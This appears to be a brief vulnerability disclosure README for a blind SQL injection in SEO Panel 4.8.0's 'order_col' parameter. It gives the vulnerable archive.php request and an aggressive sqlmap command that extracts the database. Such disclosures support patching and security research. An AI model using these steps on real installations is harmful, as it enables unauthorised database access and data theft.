# SEO-Panel-4.8.0-SQL-Injection  
# Exploit Title: SEO Panel 4.8.0 - 'order_col' Blind SQL Injection
# Date: 22/03/2021
# Vendor Homepage: https://www.seopanel.org/
# Software Link: https://github.com/seopanel/Seo-Panel/releases/tag/4.8.0
# Version: 4.8.0   

1. Login to SEO admin Panel  
2. go 192.168.100.156/seopanel/archive.php?from_time=2021-03-08&order_col=name&order_val=DESC&report_type=website-search-reports&search_name=&sec=viewWebsiteSearchSummary&to_time=2021-03-09&website_id=0  
![image](https://github.com/BigTiger2020/SEO-Panel-4.8.0-SQL-Injection/blob/main/2.png)  
3. User sqlmap Automated way:  
sqlmap.py -r 6.txt  --batch --level 5 --risk 3 --dbms=mysql --current-db --technique=T --flush-session  
![image](https://github.com/BigTiger2020/SEO-Panel-4.8.0-SQL-Injection/blob/main/1.png)
